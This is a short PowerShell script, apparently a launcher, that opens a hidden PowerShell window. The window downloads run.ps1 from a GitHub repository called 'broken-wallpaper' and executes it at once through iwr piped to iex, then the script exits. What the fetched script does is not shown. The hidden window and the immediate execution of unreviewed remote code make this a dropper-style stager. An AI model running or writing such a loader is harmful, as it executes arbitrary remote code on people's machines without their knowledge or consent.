$scriptUrl = "https://raw.githubusercontent.com/intoRandom/broken-wallpaper/refs/heads/main/run.ps1"
Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-NoProfile -Command `"iwr '$scriptUrl' -UseBasicParsing | iex`""
exit
